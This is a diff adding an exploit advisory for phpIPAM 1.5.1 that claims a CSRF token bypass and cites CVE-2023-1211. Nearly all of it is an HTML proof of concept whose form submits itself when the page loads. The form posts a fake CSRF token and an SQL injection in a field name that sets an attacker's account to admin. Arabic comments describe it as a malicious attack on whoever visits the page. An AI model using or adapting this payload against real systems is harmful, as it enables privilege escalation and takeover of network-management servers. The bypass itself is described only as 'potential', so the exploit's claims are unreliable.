@@ -1,0 +1,40 @@
+=============================================================================================================================================
+| # Title     : phpIPAM 1.5.1 CSRF Token Bypass via $POST Object Manipulation                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/phpipam/phpipam/                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212368/ & CVE-2023-1211
+
+[+] Summary : The PHPIPAM application uses $POST->csrf_cookie for CSRF validation instead of directly accessing $_POST['csrf_cookie']. This creates a potential bypass if the $POST object can be manipulated or overwritten.
+
+		  
+[+]  POC : 
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>هجوم خبيث على PHPIPAM</h1>
+<form id="csrfForm" action="http://target.com/app/admin/custom-fields/edit.php" method="POST">
+    <input type="hidden" name="csrf_cookie" value="bypassed_csrf_token" />
+    <input type="hidden" name="action" value="add" />
+    <input type="hidden" name="table" value="users" />
+    <!-- حقن SQL في اسم الحقل -->
+    <input type="hidden" name="name" value="custom_admin; UPDATE users SET role='admin' WHERE username='attacker';--" />
+    <input type="hidden" name="fieldType" value="varchar" />
+    <input type="hidden" name="fieldSize" value="255" />
+    <input type="hidden" name="NULL" value="YES" />
+    <input type="hidden" name="fieldDefault" value="" />
+</form>
+
+<script>
+// إرسال النموذج تلقائياً عندما يزور الضحية الصفحة
+document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
